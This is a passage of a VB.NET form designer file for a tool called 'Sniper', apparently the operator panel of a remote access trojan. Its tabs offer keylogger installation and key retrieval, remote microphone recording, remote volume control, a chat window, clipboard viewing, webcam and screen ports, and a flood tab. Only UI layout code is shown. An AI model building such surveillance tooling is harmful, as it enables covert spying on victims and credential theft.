        Me.lblStppK.Name = "lblStppK"
        Me.lblStppK.Size = New System.Drawing.Size(65, 13)
        Me.lblStppK.TabIndex = 8
        Me.lblStppK.Text = "STOPPED"
        '
        'cmdStopK
        '
        Me.cmdStopK.Location = New System.Drawing.Point(436, 428)
        Me.cmdStopK.Name = "cmdStopK"
        Me.cmdStopK.Size = New System.Drawing.Size(92, 23)
        Me.cmdStopK.TabIndex = 7
        Me.cmdStopK.Text = "Stop"
        Me.cmdStopK.UseVisualStyleBackColor = True
        '
        'cdSTARTOnK
        '
        Me.cdSTARTOnK.Location = New System.Drawing.Point(282, 428)
        Me.cdSTARTOnK.Name = "cdSTARTOnK"
        Me.cdSTARTOnK.Size = New System.Drawing.Size(148, 23)
        Me.cdSTARTOnK.TabIndex = 3
        Me.cdSTARTOnK.Text = "Start Online Keylogger"
        Me.cdSTARTOnK.UseVisualStyleBackColor = True
        '
        'cmdGetK
        '
        Me.cmdGetK.Location = New System.Drawing.Point(169, 428)
        Me.cmdGetK.Name = "cmdGetK"
        Me.cmdGetK.Size = New System.Drawing.Size(107, 23)
        Me.cmdGetK.TabIndex = 2
        Me.cmdGetK.Text = "Get keys"
        Me.cmdGetK.UseVisualStyleBackColor = True
        '
        'cmdInstallK
        '
        Me.cmdInstallK.Location = New System.Drawing.Point(15, 428)
        Me.cmdInstallK.Name = "cmdInstallK"
        Me.cmdInstallK.Size = New System.Drawing.Size(148, 23)
        Me.cmdInstallK.TabIndex = 1
        Me.cmdInstallK.Text = "Install offline keylogger"
        Me.cmdInstallK.UseVisualStyleBackColor = True
        '
        'txtKey
        '
        Me.txtKey.BackColor = System.Drawing.Color.Black
        Me.txtKey.ForeColor = System.Drawing.Color.Lime
        Me.txtKey.Location = New System.Drawing.Point(15, 60)
        Me.txtKey.Multiline = True
        Me.txtKey.Name = "txtKey"
        Me.txtKey.ReadOnly = True
        Me.txtKey.ScrollBars = System.Windows.Forms.ScrollBars.Both
        Me.txtKey.Size = New System.Drawing.Size(513, 361)
        Me.txtKey.TabIndex = 0
        '
        'picKB
        '
        Me.picKB.Image = Global.Sniper.My.Resources.Resources._1306238974_preferences_desktop_keyboard_shortcuts
        Me.picKB.Location = New System.Drawing.Point(468, 6)
        Me.picKB.Name = "picKB"
        Me.picKB.Size = New System.Drawing.Size(60, 48)
        Me.picKB.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage
        Me.picKB.TabIndex = 9
        Me.picKB.TabStop = False
        '
        'cmdSaveKs
        '
        Me.cmdSaveKs.Image = Global.Sniper.My.Resources.Resources._1300127122_3floppy_unmount
        Me.cmdSaveKs.Location = New System.Drawing.Point(15, 6)
        Me.cmdSaveKs.Name = "cmdSaveKs"
        Me.cmdSaveKs.Size = New System.Drawing.Size(69, 48)
        Me.cmdSaveKs.TabIndex = 5
        Me.cmdSaveKs.UseVisualStyleBackColor = True
        '
        'tbMicroP
        '
        Me.tbMicroP.BackColor = System.Drawing.SystemColors.Control
        Me.tbMicroP.Controls.Add(Me.grpVolR)
        Me.tbMicroP.Controls.Add(Me.picSound)
        Me.tbMicroP.Controls.Add(Me.grpLocRec)
        Me.tbMicroP.Controls.Add(Me.grpS1)
        Me.tbMicroP.Location = New System.Drawing.Point(4, 22)
        Me.tbMicroP.Name = "tbMicroP"
        Me.tbMicroP.Padding = New System.Windows.Forms.Padding(3)
        Me.tbMicroP.Size = New System.Drawing.Size(544, 460)
        Me.tbMicroP.TabIndex = 6
        Me.tbMicroP.Text = "Microphone"
        '
        'grpVolR
        '
        Me.grpVolR.Controls.Add(Me.cmdSetAlC)
        Me.grpVolR.Controls.Add(Me.cmdMuteR)
        Me.grpVolR.Controls.Add(Me.cmdSetVR)
        Me.grpVolR.Location = New System.Drawing.Point(284, 130)
        Me.grpVolR.Name = "grpVolR"
        Me.grpVolR.Size = New System.Drawing.Size(212, 153)
        Me.grpVolR.TabIndex = 10
        Me.grpVolR.TabStop = False
        Me.grpVolR.Text = "Remote volume"
        '
        'cmdSetAlC
        '
        Me.cmdSetAlC.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Italic, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.cmdSetAlC.Image = Global.Sniper.My.Resources.Resources._1307280225_contrast_decrease
        Me.cmdSetAlC.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft
        Me.cmdSetAlC.Location = New System.Drawing.Point(6, 106)
        Me.cmdSetAlC.Name = "cmdSetAlC"
        Me.cmdSetAlC.Size = New System.Drawing.Size(200, 40)
        Me.cmdSetAlC.TabIndex = 13
        Me.cmdSetAlC.Text = "Decrease volume"
        Me.cmdSetAlC.UseVisualStyleBackColor = True
        '
        'cmdMuteR
        '
        Me.cmdMuteR.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Italic, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.cmdMuteR.Image = Global.Sniper.My.Resources.Resources._1307280197_sound_mute
        Me.cmdMuteR.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft
        Me.cmdMuteR.Location = New System.Drawing.Point(6, 19)
        Me.cmdMuteR.Name = "cmdMuteR"
        Me.cmdMuteR.Size = New System.Drawing.Size(200, 40)
        Me.cmdMuteR.TabIndex = 12
        Me.cmdMuteR.Text = "Mute"
        Me.cmdMuteR.UseVisualStyleBackColor = True
        '
        'cmdSetVR
        '
        Me.cmdSetVR.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Italic, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.cmdSetVR.Image = Global.Sniper.My.Resources.Resources._1307280249_increase
        Me.cmdSetVR.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft
        Me.cmdSetVR.Location = New System.Drawing.Point(6, 63)
        Me.cmdSetVR.Name = "cmdSetVR"
        Me.cmdSetVR.Size = New System.Drawing.Size(200, 37)
        Me.cmdSetVR.TabIndex = 11
        Me.cmdSetVR.Text = "Increase volume"
        Me.cmdSetVR.UseVisualStyleBackColor = True
        '
        'picSound
        '
        Me.picSound.Image = Global.Sniper.My.Resources.Resources._1306255534_audacity
        Me.picSound.Location = New System.Drawing.Point(7, 326)
        Me.picSound.Name = "picSound"
        Me.picSound.Size = New System.Drawing.Size(128, 128)
        Me.picSound.SizeMode = System.Windows.Forms.PictureBoxSizeMode.AutoSize
        Me.picSound.TabIndex = 2
        Me.picSound.TabStop = False
        '
        'grpLocRec
        '
        Me.grpLocRec.Controls.Add(Me.lblTOTKbLo)
        Me.grpLocRec.Controls.Add(Me.cmdStopRecLO)
        Me.grpLocRec.Controls.Add(Me.cmdREcLoc)
        Me.grpLocRec.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, CType((System.Drawing.FontStyle.Bold Or System.Drawing.FontStyle.Italic), System.Drawing.FontStyle), System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.grpLocRec.Location = New System.Drawing.Point(45, 183)
        Me.grpLocRec.Name = "grpLocRec"
        Me.grpLocRec.Size = New System.Drawing.Size(230, 100)
        Me.grpLocRec.TabIndex = 1
        Me.grpLocRec.TabStop = False
        Me.grpLocRec.Text = "Local Recorder Settings"
        '
        'lblTOTKbLo
        '
        Me.lblTOTKbLo.AutoSize = True
        Me.lblTOTKbLo.Location = New System.Drawing.Point(7, 74)
        Me.lblTOTKbLo.Name = "lblTOTKbLo"
        Me.lblTOTKbLo.Size = New System.Drawing.Size(84, 13)
        Me.lblTOTKbLo.TabIndex = 10
        Me.lblTOTKbLo.Text = "Total Kb: 0kb"
        '
        'cmdStopRecLO
        '
        Me.cmdStopRecLO.Image = Global.Sniper.My.Resources.Resources._1306254272_Stop1NormalRed
        Me.cmdStopRecLO.Location = New System.Drawing.Point(162, 16)
        Me.cmdStopRecLO.Name = "cmdStopRecLO"
        Me.cmdStopRecLO.Size = New System.Drawing.Size(59, 75)
        Me.cmdStopRecLO.TabIndex = 9
        Me.cmdStopRecLO.Text = "STOP"
        Me.cmdStopRecLO.TextAlign = System.Drawing.ContentAlignment.BottomCenter
        Me.cmdStopRecLO.UseVisualStyleBackColor = True
        '
        'cmdREcLoc
        '
        Me.cmdREcLoc.Image = Global.Sniper.My.Resources.Resources._1306254106_player_rec
        Me.cmdREcLoc.Location = New System.Drawing.Point(97, 16)
        Me.cmdREcLoc.Name = "cmdREcLoc"
        Me.cmdREcLoc.Size = New System.Drawing.Size(59, 75)
        Me.cmdREcLoc.TabIndex = 8
        Me.cmdREcLoc.Text = "REC"
        Me.cmdREcLoc.TextAlign = System.Drawing.ContentAlignment.BottomCenter
        Me.cmdREcLoc.UseVisualStyleBackColor = True
        '
        'grpS1
        '
        Me.grpS1.Controls.Add(Me.cmdGetDS)
        Me.grpS1.Controls.Add(Me.lblTotKbS)
        Me.grpS1.Controls.Add(Me.prgDatS)
        Me.grpS1.Controls.Add(Me.lblArrDat)
        Me.grpS1.Controls.Add(Me.cmdStopRec)
        Me.grpS1.Controls.Add(Me.cmdStartRec)
        Me.grpS1.Controls.Add(Me.lblRecTim)
        Me.grpS1.Controls.Add(Me.lblRecT)
        Me.grpS1.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.grpS1.Location = New System.Drawing.Point(45, 24)
        Me.grpS1.Name = "grpS1"
        Me.grpS1.Size = New System.Drawing.Size(451, 100)
        Me.grpS1.TabIndex = 0
        Me.grpS1.TabStop = False
        Me.grpS1.Text = "Recorder Settings"
        '
        'cmdGetDS
        '
        Me.cmdGetDS.Enabled = False
        Me.cmdGetDS.Font = New System.Drawing.Font("Microsoft Sans Serif", 9.75!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.cmdGetDS.Image = Global.Sniper.My.Resources.Resources._1299786608_10
        Me.cmdGetDS.Location = New System.Drawing.Point(225, 17)
        Me.cmdGetDS.Name = "cmdGetDS"
        Me.cmdGetDS.Size = New System.Drawing.Size(59, 75)
        Me.cmdGetDS.TabIndex = 7
        Me.cmdGetDS.Text = "Get Data"
        Me.cmdGetDS.TextAlign = System.Drawing.ContentAlignment.BottomCenter
        Me.cmdGetDS.UseVisualStyleBackColor = True
        '
        'lblTotKbS
        '
        Me.lblTotKbS.AutoSize = True
        Me.lblTotKbS.Location = New System.Drawing.Point(354, 79)
        Me.lblTotKbS.Name = "lblTotKbS"
        Me.lblTotKbS.Size = New System.Drawing.Size(84, 13)
        Me.lblTotKbS.TabIndex = 6
        Me.lblTotKbS.Text = "Total Kb: 0kb"
        '
        'prgDatS
        '
        Me.prgDatS.Location = New System.Drawing.Point(9, 34)
        Me.prgDatS.Name = "prgDatS"
        Me.prgDatS.Size = New System.Drawing.Size(145, 23)
        Me.prgDatS.TabIndex = 5
        '
        'lblArrDat
        '
        Me.lblArrDat.AutoSize = True
        Me.lblArrDat.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Italic, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.lblArrDat.Location = New System.Drawing.Point(6, 17)
        Me.lblArrDat.Name = "lblArrDat"
        Me.lblArrDat.Size = New System.Drawing.Size(73, 13)
        Me.lblArrDat.TabIndex = 4
        Me.lblArrDat.Text = "Data arriving.."
        '
        'cmdStopRec
        '
        Me.cmdStopRec.Image = Global.Sniper.My.Resources.Resources._1306254272_Stop1NormalRed
        Me.cmdStopRec.Location = New System.Drawing.Point(289, 17)
        Me.cmdStopRec.Name = "cmdStopRec"
        Me.cmdStopRec.Size = New System.Drawing.Size(59, 75)
        Me.cmdStopRec.TabIndex = 3
        Me.cmdStopRec.Text = "STOP"
        Me.cmdStopRec.TextAlign = System.Drawing.ContentAlignment.BottomCenter
        Me.cmdStopRec.UseVisualStyleBackColor = True
        '
        'cmdStartRec
        '
        Me.cmdStartRec.Image = Global.Sniper.My.Resources.Resources._1306254106_player_rec
        Me.cmdStartRec.Location = New System.Drawing.Point(160, 17)
        Me.cmdStartRec.Name = "cmdStartRec"
        Me.cmdStartRec.Size = New System.Drawing.Size(59, 75)
        Me.cmdStartRec.TabIndex = 2
        Me.cmdStartRec.Text = "REC"
        Me.cmdStartRec.TextAlign = System.Drawing.ContentAlignment.BottomCenter
        Me.cmdStartRec.UseVisualStyleBackColor = True
        '
        'lblRecTim
        '
        Me.lblRecTim.AutoSize = True
        Me.lblRecTim.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.lblRecTim.Location = New System.Drawing.Point(105, 75)
        Me.lblRecTim.Name = "lblRecTim"
        Me.lblRecTim.Size = New System.Drawing.Size(49, 13)
        Me.lblRecTim.TabIndex = 1
        Me.lblRecTim.Text = "00:00:00"
        '
        'lblRecT
        '
        Me.lblRecT.AutoSize = True
        Me.lblRecT.ForeColor = System.Drawing.Color.Red
        Me.lblRecT.Location = New System.Drawing.Point(6, 75)
        Me.lblRecT.Name = "lblRecT"
        Me.lblRecT.Size = New System.Drawing.Size(93, 13)
        Me.lblRecT.TabIndex = 0
        Me.lblRecT.Text = "Recorded time:"
        '
        'tbpChat
        '
        Me.tbpChat.BackColor = System.Drawing.SystemColors.Control
        Me.tbpChat.Controls.Add(Me.lblTipChat)
        Me.tbpChat.Controls.Add(Me.cmdSendC)
        Me.tbpChat.Controls.Add(Me.cmdCloseC)
        Me.tbpChat.Controls.Add(Me.cmdOpenC)
        Me.tbpChat.Controls.Add(Me.txtChatB)
        Me.tbpChat.Controls.Add(Me.txtRName)
        Me.tbpChat.Controls.Add(Me.lblRN)
        Me.tbpChat.Controls.Add(Me.txtName)
        Me.tbpChat.Controls.Add(Me.lblName)
        Me.tbpChat.Controls.Add(Me.txtChatBox)
        Me.tbpChat.Location = New System.Drawing.Point(4, 22)
        Me.tbpChat.Name = "tbpChat"
        Me.tbpChat.Padding = New System.Windows.Forms.Padding(3)
        Me.tbpChat.Size = New System.Drawing.Size(544, 460)
        Me.tbpChat.TabIndex = 7
        Me.tbpChat.Text = "Chat Fun"
        '
        'lblTipChat
        '
        Me.lblTipChat.AutoSize = True
        Me.lblTipChat.Location = New System.Drawing.Point(7, 10)
        Me.lblTipChat.Name = "lblTipChat"
        Me.lblTipChat.Size = New System.Drawing.Size(263, 13)
        Me.lblTipChat.TabIndex = 9
        Me.lblTipChat.Text = "Tip: If you use an other feature, the chat will be closed"
        '
        'cmdSendC
        '
        Me.cmdSendC.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, CType((System.Drawing.FontStyle.Bold Or System.Drawing.FontStyle.Italic), System.Drawing.FontStyle), System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.cmdSendC.Location = New System.Drawing.Point(464, 390)
        Me.cmdSendC.Name = "cmdSendC"
        Me.cmdSendC.Size = New System.Drawing.Size(74, 64)
        Me.cmdSendC.TabIndex = 8
        Me.cmdSendC.Text = "SEND"
        Me.cmdSendC.UseVisualStyleBackColor = True
        '
        'cmdCloseC
        '
        Me.cmdCloseC.Location = New System.Drawing.Point(120, 431)
        Me.cmdCloseC.Name = "cmdCloseC"
        Me.cmdCloseC.Size = New System.Drawing.Size(100, 23)
        Me.cmdCloseC.TabIndex = 7
        Me.cmdCloseC.Text = "Close Chat"
        Me.cmdCloseC.UseVisualStyleBackColor = True
        '
        'cmdOpenC
        '
        Me.cmdOpenC.Location = New System.Drawing.Point(10, 431)
        Me.cmdOpenC.Name = "cmdOpenC"
        Me.cmdOpenC.Size = New System.Drawing.Size(100, 23)
        Me.cmdOpenC.TabIndex = 6
        Me.cmdOpenC.Text = "Open Chat"
        Me.cmdOpenC.UseVisualStyleBackColor = True
        '
        'txtChatB
        '
        Me.txtChatB.Location = New System.Drawing.Point(233, 390)
        Me.txtChatB.Multiline = True
        Me.txtChatB.Name = "txtChatB"
        Me.txtChatB.ScrollBars = System.Windows.Forms.ScrollBars.Both
        Me.txtChatB.Size = New System.Drawing.Size(225, 64)
        Me.txtChatB.TabIndex = 5
        '
        'txtRName
        '
        Me.txtRName.Location = New System.Drawing.Point(120, 407)
        Me.txtRName.Name = "txtRName"
        Me.txtRName.Size = New System.Drawing.Size(100, 20)
        Me.txtRName.TabIndex = 4
        Me.txtRName.Text = "PC-1"
        '
        'lblRN
        '
        Me.lblRN.AutoSize = True
        Me.lblRN.Location = New System.Drawing.Point(117, 390)
        Me.lblRN.Name = "lblRN"
        Me.lblRN.Size = New System.Drawing.Size(81, 13)
        Me.lblRN.TabIndex = 3
        Me.lblRN.Text = "Remote Name: "
        '
        'txtName
        '
        Me.txtName.Location = New System.Drawing.Point(10, 407)
        Me.txtName.Name = "txtName"
        Me.txtName.Size = New System.Drawing.Size(100, 20)
        Me.txtName.TabIndex = 2
        Me.txtName.Text = "Example"
        '
        'lblName
        '
        Me.lblName.AutoSize = True
        Me.lblName.Location = New System.Drawing.Point(7, 390)
        Me.lblName.Name = "lblName"
        Me.lblName.Size = New System.Drawing.Size(63, 13)
        Me.lblName.TabIndex = 1
        Me.lblName.Text = "Your Name:"
        '
        'txtChatBox
        '
        Me.txtChatBox.BackColor = System.Drawing.Color.Black
        Me.txtChatBox.ForeColor = System.Drawing.Color.Lime
        Me.txtChatBox.Location = New System.Drawing.Point(7, 26)
        Me.txtChatBox.Multiline = True
        Me.txtChatBox.Name = "txtChatBox"
        Me.txtChatBox.ReadOnly = True
        Me.txtChatBox.ScrollBars = System.Windows.Forms.ScrollBars.Both
        Me.txtChatBox.Size = New System.Drawing.Size(531, 357)
        Me.txtChatBox.TabIndex = 0
        '
        'tbPorts
        '
        Me.tbPorts.BackColor = System.Drawing.SystemColors.Control
        Me.tbPorts.Controls.Add(Me.grpPS)
        Me.tbPorts.Location = New System.Drawing.Point(4, 22)
        Me.tbPorts.Name = "tbPorts"
        Me.tbPorts.Padding = New System.Windows.Forms.Padding(3)
        Me.tbPorts.Size = New System.Drawing.Size(544, 460)
        Me.tbPorts.TabIndex = 8
        Me.tbPorts.Text = "Ports Settings"
        '
        'grpPS
        '
        Me.grpPS.Controls.Add(Me.cmdSetPorts)
        Me.grpPS.Controls.Add(Me.picF)
        Me.grpPS.Controls.Add(Me.nudSD)
        Me.grpPS.Controls.Add(Me.lbl6)
        Me.grpPS.Controls.Add(Me.nudD)
        Me.grpPS.Controls.Add(Me.lbl5)
        Me.grpPS.Controls.Add(Me.nudU)
        Me.grpPS.Controls.Add(Me.lbl4)
        Me.grpPS.Controls.Add(Me.NudK)
        Me.grpPS.Controls.Add(Me.lbl3)
        Me.grpPS.Controls.Add(Me.nudW)
        Me.grpPS.Controls.Add(Me.lbl2)
        Me.grpPS.Controls.Add(Me.nudS)
        Me.grpPS.Controls.Add(Me.lbl1)
        Me.grpPS.Location = New System.Drawing.Point(101, 102)
        Me.grpPS.Name = "grpPS"
        Me.grpPS.Size = New System.Drawing.Size(372, 184)
        Me.grpPS.TabIndex = 1
        Me.grpPS.TabStop = False
        Me.grpPS.Text = "Ports Settings"
        '
        'cmdSetPorts
        '
        Me.cmdSetPorts.Location = New System.Drawing.Point(250, 152)
        Me.cmdSetPorts.Name = "cmdSetPorts"
        Me.cmdSetPorts.Size = New System.Drawing.Size(100, 23)
        Me.cmdSetPorts.TabIndex = 14
        Me.cmdSetPorts.Text = "Save settings"
        Me.cmdSetPorts.UseVisualStyleBackColor = True
        '
        'picF
        '
        Me.picF.Image = Global.Sniper.My.Resources.Resources._1295815212_quick_restart
        Me.picF.Location = New System.Drawing.Point(250, 28)
        Me.picF.Name = "picF"
        Me.picF.Size = New System.Drawing.Size(100, 121)
        Me.picF.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage
        Me.picF.TabIndex = 13
        Me.picF.TabStop = False
        '
        'nudSD
        '
        Me.nudSD.Location = New System.Drawing.Point(106, 155)
        Me.nudSD.Maximum = New Decimal(New Integer() {99999, 0, 0, 0})
        Me.nudSD.Minimum = New Decimal(New Integer() {1, 0, 0, 0})
        Me.nudSD.Name = "nudSD"
        Me.nudSD.Size = New System.Drawing.Size(120, 20)
        Me.nudSD.TabIndex = 12
        Me.nudSD.Value = New Decimal(New Integer() {6552, 0, 0, 0})
        '
        'lbl6
        '
        Me.lbl6.AutoSize = True
        Me.lbl6.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, CType((System.Drawing.FontStyle.Bold Or System.Drawing.FontStyle.Italic), System.Drawing.FontStyle), System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.lbl6.Location = New System.Drawing.Point(6, 157)
        Me.lbl6.Name = "lbl6"
        Me.lbl6.Size = New System.Drawing.Size(74, 13)
        Me.lbl6.TabIndex = 11
        Me.lbl6.Text = "Sound Port:"
        '
        'nudD
        '
        Me.nudD.Location = New System.Drawing.Point(106, 129)
        Me.nudD.Maximum = New Decimal(New Integer() {99999, 0, 0, 0})
        Me.nudD.Minimum = New Decimal(New Integer() {1, 0, 0, 0})
        Me.nudD.Name = "nudD"
        Me.nudD.Size = New System.Drawing.Size(120, 20)
        Me.nudD.TabIndex = 10
        Me.nudD.Value = New Decimal(New Integer() {6552, 0, 0, 0})
        '
        'lbl5
        '
        Me.lbl5.AutoSize = True
        Me.lbl5.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, CType((System.Drawing.FontStyle.Bold Or System.Drawing.FontStyle.Italic), System.Drawing.FontStyle), System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.lbl5.Location = New System.Drawing.Point(6, 131)
        Me.lbl5.Name = "lbl5"
        Me.lbl5.Size = New System.Drawing.Size(94, 13)
        Me.lbl5.TabIndex = 9
        Me.lbl5.Text = "Download Port:"
        '
        'nudU
        '
        Me.nudU.Location = New System.Drawing.Point(106, 103)
        Me.nudU.Maximum = New Decimal(New Integer() {99999, 0, 0, 0})
        Me.nudU.Minimum = New Decimal(New Integer() {1, 0, 0, 0})
        Me.nudU.Name = "nudU"
        Me.nudU.Size = New System.Drawing.Size(120, 20)
        Me.nudU.TabIndex = 8
        Me.nudU.Value = New Decimal(New Integer() {6552, 0, 0, 0})
        '
        'lbl4
        '
        Me.lbl4.AutoSize = True
        Me.lbl4.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, CType((System.Drawing.FontStyle.Bold Or System.Drawing.FontStyle.Italic), System.Drawing.FontStyle), System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.lbl4.Location = New System.Drawing.Point(6, 105)
        Me.lbl4.Name = "lbl4"
        Me.lbl4.Size = New System.Drawing.Size(78, 13)
        Me.lbl4.TabIndex = 7
        Me.lbl4.Text = "Upload Port:"
        '
        'NudK
        '
        Me.NudK.Location = New System.Drawing.Point(106, 78)
        Me.NudK.Maximum = New Decimal(New Integer() {99999, 0, 0, 0})
        Me.NudK.Minimum = New Decimal(New Integer() {1, 0, 0, 0})
        Me.NudK.Name = "NudK"
        Me.NudK.Size = New System.Drawing.Size(120, 20)
        Me.NudK.TabIndex = 6
        Me.NudK.Value = New Decimal(New Integer() {6552, 0, 0, 0})
        '
        'lbl3
        '
        Me.lbl3.AutoSize = True
        Me.lbl3.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, CType((System.Drawing.FontStyle.Bold Or System.Drawing.FontStyle.Italic), System.Drawing.FontStyle), System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.lbl3.Location = New System.Drawing.Point(6, 80)
        Me.lbl3.Name = "lbl3"
        Me.lbl3.Size = New System.Drawing.Size(94, 13)
        Me.lbl3.TabIndex = 5
        Me.lbl3.Text = "Keylogger Port:"
        '
        'nudW
        '
        Me.nudW.Location = New System.Drawing.Point(106, 52)
        Me.nudW.Maximum = New Decimal(New Integer() {99999, 0, 0, 0})
        Me.nudW.Minimum = New Decimal(New Integer() {1, 0, 0, 0})
        Me.nudW.Name = "nudW"
        Me.nudW.Size = New System.Drawing.Size(120, 20)
        Me.nudW.TabIndex = 4
        Me.nudW.Value = New Decimal(New Integer() {6552, 0, 0, 0})
        '
        'lbl2
        '
        Me.lbl2.AutoSize = True
        Me.lbl2.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, CType((System.Drawing.FontStyle.Bold Or System.Drawing.FontStyle.Italic), System.Drawing.FontStyle), System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.lbl2.Location = New System.Drawing.Point(6, 54)
        Me.lbl2.Name = "lbl2"
        Me.lbl2.Size = New System.Drawing.Size(87, 13)
        Me.lbl2.TabIndex = 3
        Me.lbl2.Text = "Webcam Port:"
        '
        'nudS
        '
        Me.nudS.Location = New System.Drawing.Point(106, 26)
        Me.nudS.Maximum = New Decimal(New Integer() {99999, 0, 0, 0})
        Me.nudS.Minimum = New Decimal(New Integer() {1, 0, 0, 0})
        Me.nudS.Name = "nudS"
        Me.nudS.Size = New System.Drawing.Size(120, 20)
        Me.nudS.TabIndex = 2
        Me.nudS.Value = New Decimal(New Integer() {6552, 0, 0, 0})
        '
        'lbl1
        '
        Me.lbl1.AutoSize = True
        Me.lbl1.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, CType((System.Drawing.FontStyle.Bold Or System.Drawing.FontStyle.Italic), System.Drawing.FontStyle), System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.lbl1.Location = New System.Drawing.Point(6, 28)
        Me.lbl1.Name = "lbl1"
        Me.lbl1.Size = New System.Drawing.Size(78, 13)
        Me.lbl1.TabIndex = 1
        Me.lbl1.Text = "Screen Port:"
        '
        'tbClip
        '
        Me.tbClip.BackColor = System.Drawing.SystemColors.Control
        Me.tbClip.Controls.Add(Me.lblCTip)
        Me.tbClip.Controls.Add(Me.txtVisNoLis)
        Me.tbClip.Controls.Add(Me.cmdCloSet)
        Me.tbClip.Controls.Add(Me.cmdSet)
        Me.tbClip.Controls.Add(Me.txtData)
        Me.tbClip.Controls.Add(Me.lstwClipboard)
        Me.tbClip.Location = New System.Drawing.Point(4, 22)
        Me.tbClip.Name = "tbClip"
        Me.tbClip.Padding = New System.Windows.Forms.Padding(3)
        Me.tbClip.Size = New System.Drawing.Size(544, 460)
        Me.tbClip.TabIndex = 9
        Me.tbClip.Text = "Clipboard"
        '
        'lblCTip
        '
        Me.lblCTip.AutoSize = True
        Me.lblCTip.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.lblCTip.Location = New System.Drawing.Point(6, 439)
        Me.lblCTip.Name = "lblCTip"
        Me.lblCTip.Size = New System.Drawing.Size(524, 13)
        Me.lblCTip.TabIndex = 7
        Me.lblCTip.Text = "Tip: Right click on desidered item to manage it. If you want to see a text which " & _
            "is too long, click two times on it"
        '
        'txtVisNoLis
        '
        Me.txtVisNoLis.BackColor = System.Drawing.SystemColors.Highlight
        Me.txtVisNoLis.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.txtVisNoLis.Location = New System.Drawing.Point(168, 118)
        Me.txtVisNoLis.Multiline = True
        Me.txtVisNoLis.Name = "txtVisNoLis"
        Me.txtVisNoLis.ReadOnly = True
        Me.txtVisNoLis.ScrollBars = System.Windows.Forms.ScrollBars.Both
        Me.txtVisNoLis.Size = New System.Drawing.Size(234, 186)
        Me.txtVisNoLis.TabIndex = 4
        Me.txtVisNoLis.Visible = False
        '
        'cmdCloSet
        '
        Me.cmdCloSet.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.cmdCloSet.Location = New System.Drawing.Point(364, 88)
        Me.cmdCloSet.Name = "cmdCloSet"
        Me.cmdCloSet.Size = New System.Drawing.Size(37, 23)
        Me.cmdCloSet.TabIndex = 3
        Me.cmdCloSet.Text = "X"
        Me.cmdCloSet.UseVisualStyleBackColor = True
        Me.cmdCloSet.Visible = False
        '
        'cmdSet
        '
        Me.cmdSet.Location = New System.Drawing.Point(168, 89)
        Me.cmdSet.Name = "cmdSet"
        Me.cmdSet.Size = New System.Drawing.Size(75, 23)
        Me.cmdSet.TabIndex = 2
        Me.cmdSet.Text = "Set"
        Me.cmdSet.UseVisualStyleBackColor = True
        Me.cmdSet.Visible = False
        '
        'txtData
        '
        Me.txtData.BackColor = System.Drawing.SystemColors.HotTrack
        Me.txtData.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.txtData.Location = New System.Drawing.Point(168, 118)
        Me.txtData.Multiline = True
        Me.txtData.Name = "txtData"
        Me.txtData.ScrollBars = System.Windows.Forms.ScrollBars.Both
        Me.txtData.Size = New System.Drawing.Size(234, 186)
        Me.txtData.TabIndex = 1
        Me.txtData.Visible = False
        '
        'lstwClipboard
        '
        Me.lstwClipboard.GridLines = True
        Me.lstwClipboard.Location = New System.Drawing.Point(4, 7)
        Me.lstwClipboard.MultiSelect = False
        Me.lstwClipboard.Name = "lstwClipboard"
        Me.lstwClipboard.Size = New System.Drawing.Size(534, 429)
        Me.lstwClipboard.TabIndex = 0
        Me.lstwClipboard.UseCompatibleStateImageBehavior = False
        Me.lstwClipboard.View = System.Windows.Forms.View.Details
        '
        'tbDD
        '
        Me.tbDD.BackColor = System.Drawing.SystemColors.Control
        Me.tbDD.Controls.Add(Me.lblTipFloo)
        Me.tbDD.Controls.Add(Me.grpFlloo)
        Me.tbDD.Location = New System.Drawing.Point(4, 22)
